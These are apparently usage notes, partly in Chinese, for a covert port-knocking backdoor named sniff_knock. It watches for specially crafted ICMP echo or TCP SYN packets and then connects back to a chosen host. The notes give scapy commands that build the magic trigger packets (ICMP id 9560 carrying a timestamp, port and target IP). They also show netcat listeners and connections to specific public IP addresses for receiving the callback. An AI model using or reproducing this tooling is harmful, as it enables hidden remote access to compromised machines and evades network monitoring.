(1) icmp
>>> ./sniff_knock -i lo -f 'icmp[icmptype] == icmp-echo' -p 50

利用scapy框架
send(IP(dst="127.0.0.1")/ICMP(id=9560,seq=1)/(struct.pack('L',int(time.time()))+struct.pack('!H',4000)+46*"0"))

(2) tcp 回连 sport
>>> ./sniff_knock -i eth1 -f 'tcp[tcpflags] & tcp-syn != 0 and tcp src port 49527' -p 34 -o 1
# 注意:若没有syn条件,则会进入无限循环的BUG

>>> nc 121.42.41.165 9999 -p 49528

(3) tcp 回连指定 port
>>> ./sniff_knock -i lo -f 'icmp[icmptype] == icmp-echo' -P 53

(4) tcp 指定 ip
>>> ./sniff_knock -i eth1 -f 'icmp[icmptype] == icmp-echo' -a 50 -p 54 

@vps 138.128.192.146
nc -l 4000

@任何机器
ip = '138.128.192.146'
ip_chr = ''.join(map(chr,map(int,(ip.split('.')))))
send(IP(dst=ip)/ICMP(id=9560,seq=1)/(struct.pack('L',int(time.time()))+ip_chr+struct.pack('!H',4000)+42*"0"))
